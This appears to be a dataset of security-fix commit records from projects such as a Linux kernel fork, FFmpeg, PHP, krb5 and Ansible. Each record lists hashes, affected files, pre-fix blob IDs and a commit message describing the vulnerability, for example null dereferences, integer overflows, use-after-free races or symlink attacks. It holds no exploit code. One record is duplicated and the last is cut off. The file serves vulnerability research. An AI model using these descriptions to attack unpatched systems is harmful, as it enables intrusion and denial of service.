    ba05dd80a020fb553752ff2b80e04a20b862c26f
    c6bfd13f6c92ff416688659b54600026cf382de1
    d36f34e25bed516db48e16790dd20fd3e8017b1e
    e75bb87ee92b87f39d67b883bb22f4f77fce3a79
Projects:
    0-T-0_ps4-linux
Commit Message for 4ec0ef3a82125efc36173062a50624550a900ae0:
USB: iowarrior: fix oops with malicious USB descriptors\n\nThe iowarrior driver expects at least one valid endpoint.  If given malicious descriptors that specify 0 for the number of endpoints, it will crash in the probe function.  Ensure there is at least one endpoint on the interface before using it.\n\nThe full report of this issue can be found here: http://seclists.org/bugtraq/2016/Mar/87\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Cc: stable <stable@vger.kernel.org> Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    6fcdb8f1f538b9d63e63a5fa199c5514a15d4564
File(s) In Commit: 
    lib/lha_file_header.c
Blob(s) In Commit: 
    b06be91affa30b4175667f3f7473d1d27c5b160c
Blob(s) Before Fix: 
    2889eecdc4ae61f0803b65ef68dfe977f2183d38
Projects:
    jmtd_lhasa
Commit Message for 6fcdb8f1f538b9d63e63a5fa199c5514a15d4564:
Fix integer underflow vulnerability in L3 decode.\n\nMarcin 'Icewall' Noga of Cisco TALOS discovered that the level 3 header decoding routines were vulnerable to an integer underflow, if the 32-bit header length was less than the base level 3 header length. This could lead to an exploitable heap corruption condition.\n\nThanks go to Marcin Noga and Regina Wilson of Cisco TALOS for reporting this vulnerability.

======================================================================
Commit With Fix: 
    a1b14d27ed0965838350f1377ff97c93ee383492
File(s) In Commit: 
    kernel/bpf/verifier.c
Blob(s) In Commit: 
    2e7f7ab739e41c46072a69e787bf4e44f560ae55
Blob(s) Before Fix: 
    039d866fd36ab0e1d553166acbf2aa8b86bbab06
    2cbfba78d3db792db4795cb031dc61a646106124
    36c6efeffdd536df30906dc59e43af1d52ff4397
    47dcd3aa6e236e14d85f33e6d74c44e6257d159b
    9f81818f294185988c9cc181274ed38789774871
    a28e09c7825d76d5ab10530a88fa183994f48d1e
    a7945d10b378bed8eb7243bd52923d232b1f49de
    c2ff608c1984ed3f7e5031d5f9fbcfe479f7fc67
    c6073056badf02293c7e9d1e35dce9bb88536c67
    d1d3e8f57de907764fe3080632062485f5639443
Projects:
    0-T-0_ps4-linux
Commit Message for a1b14d27ed0965838350f1377ff97c93ee383492:
bpf: fix branch offset adjustment on backjumps after patching ctx expansion\n\nWhen ctx access is used, the kernel often needs to expand/rewrite instructions, so after that patching, branch offsets have to be adjusted for both forward and backward jumps in the new eBPF program, but for backward jumps it fails to account the delta. Meaning, for example, if the expansion happens exactly on the insn that sits at the jump target, it doesn't fix up the back jump offset.\n\nAnalysis on what the check in adjust_branches() is currently doing:\n\n  /* adjust offset of jmps if necessary */   if (i < pos && i + insn->off + 1 > pos)     insn->off += delta    else if (i > pos && i + insn->off + 1 < pos)     insn->off -= delta \n\nFirst condition (forward jumps):\n\n  Before:                         After:\n\n  insns[0]                        insns[0]   insns[1] <--- i/insn            insns[1] <--- i/insn   insns[2] <--- pos               insns[P] <--- pos   insns[3]                        insns[P]  `------| delta   insns[4] <--- target_X          insns[P]   `-----|   insns[5]                        insns[3]                                   insns[4] <--- target_X                                   insns[5]\n\nFirst case is if we cross pos-boundary and the jump instruction was before pos. This is handeled correctly. I.e. if i == pos, then this would mean our jump that we currently check was the patchlet itself that we just injected. Since such patchlets are self-contained and have no awareness of any insns before or after the patched one, the delta is correctly not adjusted. Also, for the second condition in case of i + insn->off + 1 == pos, means we jump to that newly patched instruction, so no offset adjustment are needed. That part is correct.\n\nSecond condition (backward jumps):\n\n  Before:                         After:\n\n  insns[0]                        insns[0]   insns[1] <--- target_X          insns[1] <--- target_X   insns[2] <--- pos <-- target_Y  insns[P] <--- pos <-- target_Y   insns[3]                        insns[P]  `------| delta   insns[4] <--- i/insn            insns[P]   `-----|   insns[5]                        insns[3]                                   insns[4] <--- i/insn                                   insns[5]\n\nSecond interesting case is where we cross pos-boundary and the jump instruction was after pos. Backward jump with i == pos would be impossible and pose a bug somewhere in the patchlet, so the first condition checking i > pos is okay only by itself. However, i + insn->off + 1 < pos does not always work as intended to trigger the adjustment. It works when jump targets would be far off where the delta wouldn't matter. But, for example, where the fixed insn->off before pointed to pos (target_Y), it now points to pos + delta, so that additional room needs to be taken into account for the check. This means that i) both tests here need to be adjusted into pos + delta, and ii) for the second condition, the test needs to be <= as pos itself can be a target in the backjump, too.\n\nFixes: 9bac3d6d548e ("bpf: allow extended BPF programs access skb fields") Signed-off-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    07d86ca93db7e5cdf4743564d98292042ec21af7
File(s) In Commit: 
    sound/usb/midi.c
Blob(s) In Commit: 
    007cf583112154bc56616234d25e92f4e5e8212c
Blob(s) Before Fix: 
    34b9bb7fe87c8eabed83df8b7b77f510bedbc2b1
    417ebb11cf4896b8009c0aa86c7dab71c34d61a4
    497d00d9cb6af286fed910398f6ab0a6be7f6fed
    5b4c58c3e2c5f6115d55ad194cd06f971e3fdb70
    5bfb695547f832e22c8ad80042bf382292460e64
    7661616f36361d142144842bd6595994829edec4
    7ba92921bf283b3ffc8c0987917afc7fe830c383
    8e01fa4991c519a07b9f7c8dda22acac1d38cb77
    9da74d2e8eeec5f40cfbfc80d892f72e79cc4e04
    a35f414672373caa75a550be4b171bc20990f09f
    b21b76690b317be9a8ee1f4f5dbba84b2c7ad37d
    b901f468b67ada579739828b382e165713de324e
    cc39f63299ef0a1fe58572ab23139f46725f9587
    de86e7487def4b5651367cda321ebea766f19150
Projects:
    0-T-0_ps4-linux
Commit Message for 07d86ca93db7e5cdf4743564d98292042ec21af7:
ALSA: usb-audio: avoid freeing umidi object twice\n\nThe 'umidi' object will be free'd on the error path by snd_usbmidi_free() when tearing down the rawmidi interface. So we shouldn't try to free it in snd_usbmidi_create() after having registered the rawmidi interface.\n\nFound by KASAN.\n\nSigned-off-by: Andrey Konovalov <andreyknvl@gmail.com> Acked-by: Clemens Ladisch <clemens@ladisch.de> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    f50c9c853e7809810099c970780c30b0765b0643
File(s) In Commit: 
    modules/seas/encode_msg.c
Blob(s) In Commit: 
    e56b5fba8932a129b5aaf03cfbf4f0c9368f40d2
Blob(s) Before Fix: 
    06d31a32e7da01a3fbb77f759eb40470831f117a
    8f84ca62a842eee6abc2e6f9148eb2bbdaaca8d0
Projects:
    1and1_kamailio
Commit Message for f50c9c853e7809810099c970780c30b0765b0643:
seas: safety check for target buffer size before copying message in encode_msg()\n\n- avoid buffer overflow for large SIP messages - reported by Stelios Tsampas

======================================================================
Commit With Fix: 
    eca4beb21e61877d76fdf6bea771f72f39544d9b
File(s) In Commit: 
    formats.js
Blob(s) In Commit: 
    9cb8380bc87403ad4212984da548a2acdacf0d3f
Blob(s) Before Fix: 
    02c109b6776d05af826e8ec1afd764317f4b733f
    3038daea921a90abf1015ef21e02e74a5ef7b273
    3d758e4acf6f0fe7f96833e6224ce3b6bf4cdf10
    5808330bb538077f1d106175a667261e82a75603
    b5fb96b05896944a94fab06ac3a12180dbb20a4d
    ff30235f076b3fde71fba6ceafa0f510e0006261
Projects:
    AmristarSolutions_is-my-json-valid
Commit Message for eca4beb21e61877d76fdf6bea771f72f39544d9b:
fix utc-millisec regex to avoid a ddos attack

======================================================================
Commit With Fix: 
    030e2c78d3a91dd0d27fef37e91950dde333eba1
File(s) In Commit: 
    sound/core/seq/seq_clientmgr.c
Blob(s) In Commit: 
    13cfa815732db759935f2daaf4c997c73016eb8c
Blob(s) Before Fix: 
    225c73152ee9e5896c06a3b7f1fbb16095bb5bd2
    48287651ac7795b8ac27e3b5a4eacb1389ec4950
    4dc6bae80e15b92a005325f845f0cc16fcd67ce0
    9ca5e647e54bf80a7a68552b0ade15ae4f5599cb
    b64f20deba90352307d482565b8e4f6c9d2cb4b0
    edbdab85fc02f6f8a54388e9f1b353559661497e
Projects:
    0-T-0_ps4-linux
Commit Message for 030e2c78d3a91dd0d27fef37e91950dde333eba1:
ALSA: seq: Fix missing NULL check at remove_events ioctl\n\nsnd_seq_ioctl_remove_events() calls snd_seq_fifo_clear() unconditionally even if there is no FIFO assigned, and this leads to an Oops due to NULL dereference.  The fix is just to add a proper NULL check.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    3567eb6af614dac436c4b16a8d426f9faed639b3
File(s) In Commit: 
    sound/core/seq/seq_queue.c
Blob(s) In Commit: 
    0bec02e89d5118b3dffe1e22e88e423baa037491
Blob(s) Before Fix: 
    17fe04d892f9172a6c4a43c5f2990db6e23a6bd6
    1a6dc4ff44a69bb53e4b8ab9009b957ea7fd8689
    3afc7cc0c9a79d65c20de27788c2a701be5b1623
    3b3ac96f1f5f2eace0c0a3d939164b778567ec03
    450c5187eecb6bb083736d2d2a1aad43b98c7c3f
    4c9aa462de9b111336e164142784b8a013f24a53
    5cba9fd1891391ca06ea56ef98b4a9a37d774320
    77ec214203558ed6211aa7ade21ae159f1e88840
    79e0c5604ef806d62eca084293e66222b8fe6828
    7dfd0f429410df217291271003d11ab385fcfc54
    a0cda38205b9760bc6e1d1943c8f1deb05ded567
    aad4878cee5579f2556524db0f61a069cc07fef5
    e7a8e9e4edb2063760607f11afcd6187f94a92b4
    f9077361c119d1a4a5eed6135a3d2e4042c812e5
Projects:
    0-T-0_ps4-linux
Commit Message for 3567eb6af614dac436c4b16a8d426f9faed639b3:
ALSA: seq: Fix race at timer setup and close\n\nALSA sequencer code has an open race between the timer setup ioctl and the close of the client.  This was triggered by syzkaller fuzzer, and a use-after-free was caught there as a result.\n\nThis patch papers over it by adding a proper queue->timer_mutex lock around the timer-related calls in the relevant code path.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    ee8413b01045c74340aa13ad5bdf905de32be736
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    9241784dfe7ddd3072f02972ce23ce17e8ab5919
Blob(s) Before Fix: 
    31f40f03e5b79c8aac7cb96a793ffdd7bff94e15
    490b489d713d4c892af0689d4eafb32cde2131c1
    777a45e08e539aa3c7320f31c5d1329db1ea0944
Projects:
    0-T-0_ps4-linux
Commit Message for ee8413b01045c74340aa13ad5bdf905de32be736:
ALSA: timer: Fix double unlink of active_list\n\nALSA timer instance object has a couple of linked lists and they are unlinked unconditionally at snd_timer_stop().  Meanwhile snd_timer_interrupt() unlinks it, but it calls list_del() which leaves the element list itself unchanged.  This ends up with unlinking twice, and it was caught by syzkaller fuzzer.\n\nThe fix is to use list_del_init() variant properly there, too.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    af368027a49a751d6ff4ee9e3f9961f35bb4fede
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    3810ee8f12051b1e888d1bed958f95614af0b45b
Blob(s) Before Fix: 
    31f40f03e5b79c8aac7cb96a793ffdd7bff94e15
    490b489d713d4c892af0689d4eafb32cde2131c1
    777a45e08e539aa3c7320f31c5d1329db1ea0944
    9241784dfe7ddd3072f02972ce23ce17e8ab5919
Projects:
    0-T-0_ps4-linux
Commit Message for af368027a49a751d6ff4ee9e3f9961f35bb4fede:
ALSA: timer: Fix race among timer ioctls\n\nALSA timer ioctls have an open race and this may lead to a use-after-free of timer instance object.  A simplistic fix is to make each ioctl exclusive.  We have already tread_sem for controlling the tread, and extend this as a global mutex to be applied to each ioctl.\n\nThe downside is, of course, the worse concurrency.  But these ioctls aren't to be parallel accessible, in anyway, so it should be fine to serialize there.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    b5a663aa426f4884c71cd8580adae73f33570f0d
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    4e8d7bfffff6be48770eb9825348c8c811186d11
Blob(s) Before Fix: 
    31f40f03e5b79c8aac7cb96a793ffdd7bff94e15
    3810ee8f12051b1e888d1bed958f95614af0b45b
    b0458285723a9d28bf160d595b59b61f38fe722a
Projects:
    0-T-0_ps4-linux
Commit Message for b5a663aa426f4884c71cd8580adae73f33570f0d:
ALSA: timer: Harden slave timer list handling\n\nA slave timer instance might be still accessible in a racy way while operating the master instance as it lacks of locking.  Since the master operation is mostly protected with timer->lock, we should cope with it while changing the slave instance, too.  Also, some linked lists (active_list and ack_list) of slave instances aren't unlinked immediately at stopping or closing, and this may lead to unexpected accesses.\n\nThis patch tries to address these issues.  It adds spin lock of timer->lock (either from master or slave, which is equivalent) in a few places.  For avoiding a deadlock, we ensure that the global slave_active_lock is always locked at first before each timer lock.\n\nAlso, ack and active_list of slave instances are properly unlinked at snd_timer_stop() and snd_timer_close().\n\nLast but not least, remove the superfluous call of _snd_timer_stop() at removing slave links.  This is a noop, and calling it may confuse readers wrt locking.  Further cleanup will follow in a later patch.\n\nActually we've got reports of use-after-free by syzkaller fuzzer, and this hopefully fixes these issues.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    b5a663aa426f4884c71cd8580adae73f33570f0d
File(s) In Commit: 
    sound/core/timer.c
Blob(s) In Commit: 
    4e8d7bfffff6be48770eb9825348c8c811186d11
Blob(s) Before Fix: 
    31f40f03e5b79c8aac7cb96a793ffdd7bff94e15
    3810ee8f12051b1e888d1bed958f95614af0b45b
    b0458285723a9d28bf160d595b59b61f38fe722a
Projects:
    0-T-0_ps4-linux
Commit Message for b5a663aa426f4884c71cd8580adae73f33570f0d:
ALSA: timer: Harden slave timer list handling\n\nA slave timer instance might be still accessible in a racy way while operating the master instance as it lacks of locking.  Since the master operation is mostly protected with timer->lock, we should cope with it while changing the slave instance, too.  Also, some linked lists (active_list and ack_list) of slave instances aren't unlinked immediately at stopping or closing, and this may lead to unexpected accesses.\n\nThis patch tries to address these issues.  It adds spin lock of timer->lock (either from master or slave, which is equivalent) in a few places.  For avoiding a deadlock, we ensure that the global slave_active_lock is always locked at first before each timer lock.\n\nAlso, ack and active_list of slave instances are properly unlinked at snd_timer_stop() and snd_timer_close().\n\nLast but not least, remove the superfluous call of _snd_timer_stop() at removing slave links.  This is a noop, and calling it may confuse readers wrt locking.  Further cleanup will follow in a later patch.\n\nActually we've got reports of use-after-free by syzkaller fuzzer, and this hopefully fixes these issues.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    2ba1fe7a06d3624f9a7586d672b55f08f7c670f3
File(s) In Commit: 
    sound/core/hrtimer.c
Blob(s) In Commit: 
    656d9a9032dc2165d1f30f4ef193250a07bec555
Blob(s) Before Fix: 
    14d483d6b3b00746d619fcc3695a3005a6309aad
    18cb6f476bf48e57d52c8425ddf8e1bd5055fec3
    1ac0c423903e7f3f41a2045fd20b9707df4ac00f
    34c7d48f5061b9fd2025a23e78ac63c4bcd3fd55
    38514ed6e55c22ac446224b799359c258408ad2c
    886be7da989d1ab52d647105ef3648a8045facbe
    8a1b51473fd5de05dc23f7f9168af64295fc90df
    b8b31c433d640279b9f4e13a9b46ca90d9a6452d
    e2f27022b363c482ba2614a2579f87f2b19192e3
    f845ecf7e172935f938bc52ecfe9c95c7bac4e11
Projects:
    0-T-0_ps4-linux
Commit Message for 2ba1fe7a06d3624f9a7586d672b55f08f7c670f3:
ALSA: hrtimer: Fix stall by hrtimer_cancel()\n\nhrtimer_cancel() waits for the completion from the callback, thus it must not be called inside the callback itself.  This was already a problem in the past with ALSA hrtimer driver, and the early commit [fcfdebe70759: ALSA: hrtimer - Fix lock-up] tried to address it.\n\nHowever, the previous fix is still insufficient: it may still cause a lockup when the ALSA timer instance reprograms itself in its callback. Then it invokes the start function even in snd_timer_interrupt() that is called in hrtimer callback itself, results in a CPU stall.  This is no hypothetical problem but actually triggered by syzkaller fuzzer.\n\nThis patch tries to fix the issue again.  Now we call hrtimer_try_to_cancel() at both start and stop functions so that it won't fall into a deadlock, yet giving some chance to cancel the queue if the functions have been called outside the callback.  The proper hrtimer_cancel() is called in anyway at closing, so this should be enough.\n\nReported-and-tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    3a6a9a807d99371ee126635e1a505fc1fe0df32c
File(s) In Commit: 
    libraries/sql-parser/src/Utils/Error.php
Blob(s) In Commit: 
    f0ad5afbb29dde1ce794af4d72d55b99c2c2577d
Blob(s) Before Fix: 
    2e942c4434e510351535511a4e875fe381cdcb08
    a9c0814fcfcde4b8a85091c580bcc178298e2177
    df6d5133cee15edc82963ac8caacb82ee8cff71a
Projects:
    007durgesh219_phpmyadmin
Commit Message for 3a6a9a807d99371ee126635e1a505fc1fe0df32c:
Escape query when displaying\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    cac9b50b0d75a1d50d6c056ff65c005f3224c8e0
File(s) In Commit: 
    drivers/usb/serial/visor.c
Blob(s) In Commit: 
    c53fbb3e0b8c6c8dd71558907945e9a5c0904ae3
Blob(s) Before Fix: 
    60afb39eb73c0b95d261ec367890a306621fd2de
Projects:
    0-T-0_ps4-linux
Commit Message for cac9b50b0d75a1d50d6c056ff65c005f3224c8e0:
USB: visor: fix null-deref at probe\n\nFix null-pointer dereference at probe should a (malicious) Treo device lack the expected endpoints.\n\nSpecifically, the Treo port-setup hack was dereferencing the bulk-in and interrupt-in urbs without first making sure they had been allocated by core.\n\nFixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    689e59b7ffed34eba6159dcc78e87133862e3746
File(s) In Commit: 
    libavformat/mov.c
Blob(s) In Commit: 
    93f369125a27cad2c8737ca80f144e4ea5a931fe
Blob(s) Before Fix: 
    004c4c47ea4c53538bb207bdc726edc5700681c5
    4541a6ec189fb387229b7a703e2daa6d564e5149
    b4ff1df2ebe2062d402dc9b8eb8be792e5017805
Projects:
    00ERNEST00_FFmpeg
Commit Message for 689e59b7ffed34eba6159dcc78e87133862e3746:
mov: reset dref_count on realloc to keep values consistent.\n\nThis fixes a potential crash.\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    42cb14b110a5698ccf26ce59c4441722605a3743
File(s) In Commit: 
    mm/migrate.c
Blob(s) In Commit: 
    2834faba719a9e4ea1e49af6037d2b70efcf0ad2
Blob(s) Before Fix: 
    3067e40e7be93e68ddca0b1586de11ba24e3def1
    842ecd7aaf7fa6ac1371f6137dc155c91851505c
    eb4267107d1fee9fa2a55e4076c014500e3b1edb
Projects:
    0-T-0_ps4-linux
Commit Message for 42cb14b110a5698ccf26ce59c4441722605a3743:
mm: migrate dirty page without clear_page_dirty_for_io etc\n\nclear_page_dirty_for_io() has accumulated writeback and memcg subtleties since v2.6.16 first introduced page migration  and the set_page_dirty() which completed its migration of PageDirty, later had to be moderated to __set_page_dirty_nobuffers()  then PageSwapBacked had to skip that too.\n\nNo actual problems seen with this procedure recently, but if you look into what the clear_page_dirty_for_io(page)+set_page_dirty(newpage) is actually achieving, it turns out to be nothing more than moving the PageDirty flag, and its NR_FILE_DIRTY stat from one zone to another.\n\nIt would be good to avoid a pile of irrelevant decrementations and incrementations, and improper event counting, and unnecessary descent of the radix_tree under tree_lock (to set the PAGECACHE_TAG_DIRTY which radix_tree_replace_slot() left in place anyway).\n\nDo the NR_FILE_DIRTY movement, like the other stats movements, while interrupts still disabled in migrate_page_move_mapping()  and don't even bother if the zone is the same.  Do the PageDirty movement there under tree_lock too, where old page is frozen and newpage not yet visible: bearing in mind that as soon as newpage becomes visible in radix_tree, an un-page-locked set_page_dirty() might interfere (or perhaps that's just not possible: anything doing so should already hold an additional reference to the old page, preventing its migration  but play safe).\n\nBut we do still need to transfer PageDirty in migrate_page_copy(), for those who don't go the mapping route through migrate_page_move_mapping().\n\nSigned-off-by: Hugh Dickins <hughd@google.com> Cc: Christoph Lameter <cl@linux.com> Cc: "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com> Cc: Rik van Riel <riel@redhat.com> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: Davidlohr Bueso <dave@stgolabs.net> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Sasha Levin <sasha.levin@oracle.com> Cc: Dmitry Vyukov <dvyukov@google.com> Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    3b8d4de300854b3517c7acb239b84f7726c1353c
File(s) In Commit: 
    ext/zip/php_zip.c
Blob(s) In Commit: 
    7c9adf4af780a04b82bdb1facf849d07a60b8576
Blob(s) Before Fix: 
    1791548e0e76f58ff0e6aba546e4c7cbec3b251f
    83c14b58369103717d839158d09471a4bb706e75
    db201af6347f672ad506477ac0bc2d861da0f2f4
Projects:
    0014593_php-src
Commit Message for 3b8d4de300854b3517c7acb239b84f7726c1353c:
Fix bug #71923 - integer overflow in ZipArchive::getFrom*

======================================================================
Commit With Fix: 
    9f969b94c4b4f310865455d36db207de6cffebca
File(s) In Commit: 
    server/bin/pulp-gen-ca-certificate
Blob(s) In Commit: 
    f29d047d30a6128941e27dd439db95e3d4c68746
Blob(s) Before Fix: 
    5eca2f6c38bf213c1504bde6dfb5ec4a4ed263b5
Projects:
    ATIX-AG_pulp
Commit Message for 9f969b94c4b4f310865455d36db207de6cffebca:
Use 4096 bits on the auth CA instead of 2048.

======================================================================
Commit With Fix: 
    8c6fe646ee79f5e55361b885b7efed5bec72d4a4
File(s) In Commit: 
    cloud/lxc/lxc_container.py
Blob(s) In Commit: 
    ae583fe4d72517d988022b2382e42c2f918e5b6a
Blob(s) Before Fix: 
    adacece555fb3bb61718c32a72a85df16daa8db4
Projects:
    00gh_ansible
Commit Message for 8c6fe646ee79f5e55361b885b7efed5bec72d4a4:
CVE-2016-3096: do not use predictable paths in lxc_container\n\n* do not use a predictable filename for the LXC attach script * don't use predictable filenames for LXC attach script logging * don't set a predictable archive_path\n\nthis should prevent symlink attacks which could result in * data corruption * data leakage * privilege escalation

======================================================================
Commit With Fix: 
    08c642c09c38a9c6454ab43a9b53b2a89b9eef99
File(s) In Commit: 
    src/plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c
Blob(s) In Commit: 
    79c4cf05cc2f6b2da394aa4bcdc9c29fa573fd0f
Blob(s) Before Fix: 
    6e591e197425639a8b15838bad59b8065db72859
Projects:
    3van_krb5
Commit Message for 08c642c09c38a9c6454ab43a9b53b2a89b9eef99:
Fix LDAP null deref on empty arg [CVE-2016-3119]\n\nIn the LDAP KDB module's process_db_args(), strtok_r() may return NULL if there is an empty string in the db_args array.  Check for this case and avoid dereferencing a null pointer.\n\nCVE-2016-3119:\n\nIn MIT krb5 1.6 and later, an authenticated attacker with permission to modify a principal entry can cause kadmind to dereference a null pointer by supplying an empty DB argument to the modify_principal command, if kadmind is configured to use the LDAP KDB module.\n\n    CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:ND\n\nticket: 8383 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup

======================================================================
Commit With Fix: 
    d157bd761585605b7882935ffb86286919f62ea1
File(s) In Commit: 
    net/netfilter/x_tables.c
Blob(s) In Commit: 
    582c9cfd6567ce4c7d5b3f86c15732b33a63e1b4
Blob(s) Before Fix: 
    133eb4772f12586d31b4b95aa45202318753d848
    227aa11e8409bb18be93c0c432a4d71cfb6e8f38
    272ae4d6fdf4f1dcb27eb2bc6e68414a25b63363
    51a459c3c6490cb7ce5080c5aa147920077dc9d5
    9b42b5ea6dcd68c8398c501aa5af81b6dfa83ae8
    c8a0b7da5ff4607ee6d8f163e9677cae1505a976
    d0cd2b9bf84463af1028d00ce87d2f5aab1dc736
    d4aaad747ea99b0aa877016f437a5fd46ec768ee
    f6950b8003e88c9bb59c44ded4152a5061c25d11
Projects:
    0-T-0_ps4-linux
Commit Message for d157bd761585605b7882935ffb86286919f62ea1:
netfilter: x_tables: check for size overflow\n\nBen Hawkes says:  integer overflow in xt_alloc_table_info, which on 32-bit systems can  lead to small structure allocation and a copy_from_user based heap  corruption.\n\nReported-by: Ben Hawkes <hawkes@google.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    4e9a0b05257f29cf4b75f3209243ed71614d062e
File(s) In Commit: 
    drivers/usb/serial/mct_u232.c
Blob(s) In Commit: 
    885655315de15a4b28db64da22f5d94bea7c8ea9
Blob(s) Before Fix: 
    27fa9c8a77b0745b7ccae628778d1b44ba9f41a7
    4446b8d70ac203cc8b763c38b6b93903cd1a0cb8
    50b6369647d25b976ea4433658fcf1c74053455d
    6a15adf53360f75994d9e7f3c62d2ac1ff04a461
    6edd26130e25a05ddaa3dfbbedcfae0f4a1ef51a
    70f346f1aa86f4a7c9eb880cd725cd0d2e6fb1b5
    89726f702202f4d4906ed9b16933998b72975294
    a71fa0aa04066dd38758fe35c87cf007a3b55f4a
    fd707d6a10e26359f4f96502e0bcbb1f1c79bbe1
Projects:
    0-T-0_ps4-linux
Commit Message for 4e9a0b05257f29cf4b75f3209243ed71614d062e:
USB: mct_u232: add sanity checking in probe\n\nAn attack using the lack of sanity checking in probe is known. This patch checks for the existence of a second port.\n\nCVE-2016-3136\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org [johan: add error message ] Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    c55aee1bf0e6b6feec8b2927b43f7a09a6d5f754
File(s) In Commit: 
    drivers/usb/serial/cypress_m8.c
Blob(s) In Commit: 
    bbeeb2bd55a83cebf4cfec9b4b8f2876edde1ca0
Blob(s) Before Fix: 
    01bf533928192d6f2f4b77f44995bd63fd6d1be2
    09f0f631389e37da668786e86274470d38a2c946
    216edd5826cacdbfaf5bbe2903d372f235d229d7
    244acb1299a95675fbf44b1668d1d112a6cd7a9d
    2c915be1db4ce3599580823f9b96d610fb202182
    3bdeafa29c24d43c11ac71375c5eb93b6916a18d
    558605d646f34432766b736c9b3d430e8a32a871
    72d3ae1ebc64d76f578052f50646d09823817926
    90110de715e0156da36bdfb91ac679ecc1838934
    afc886c75d2f7ad93f54733bdbbc8b7bb00527bb
    b283eb8b86d68f5b53c336ee70bc8a6cd609adce
    b78c34eb5d3f6f976aac101eb15094e8f99370e4
    bccb1223143a37298dad934842b6733e99c38032
    d9906eb9d16af4ea4b10dde628205e9816db5717
    db8f472d9e3f279ef72ab8dba68296cf8a841b07
    ed51bc48eea65b3d59df5ae8ea168994059c913b
Projects:
    0-T-0_ps4-linux
Commit Message for c55aee1bf0e6b6feec8b2927b43f7a09a6d5f754:
USB: cypress_m8: add endpoint sanity check\n\nAn attack using missing endpoints exists.\n\nCVE-2016-3137\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    8835ba4a39cf53f705417b3b3a94eb067673f2c9
File(s) In Commit: 
    drivers/usb/class/cdc-acm.c
Blob(s) In Commit: 
    83fd30b0577c55f33eace402617ff3a2a4b09126
Blob(s) Before Fix: 
    1d2c99af253240786ed74c65027e6c8e26d61f25
    26ca4f910cb020aae539f29b260a98fe1eee92b0
    683617714e7cf852fdf3fc2d4ec8590ab6d1a114
    b30e7423549b04b0e7d442a128048b4221c68062
    e78720b59d67e66adebff9594475b124341b0608
    e934e19f49f57e3e463c31c65caa76cca3fee905
    fa4e23930614a47ac14ece43e863286fadb91402
Projects:
    0-T-0_ps4-linux
Commit Message for 8835ba4a39cf53f705417b3b3a94eb067673f2c9:
USB: cdc-acm: more sanity checking\n\nAn attack has become available which pretends to be a quirky device circumventing normal sanity checks and crashes the kernel by an insufficient number of interfaces. This patch adds a check to the code path for quirky devices.\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    5a07975ad0a36708c6b0a5b9fea1ff811d0b0c1f
File(s) In Commit: 
    drivers/usb/serial/digi_acceleport.c
Blob(s) In Commit: 
    16e8e37b3b36d521749ec48d17b2becfc4ae4f51
Blob(s) Before Fix: 
    010a42a92688954d7b65a82472d28fad346c80c3
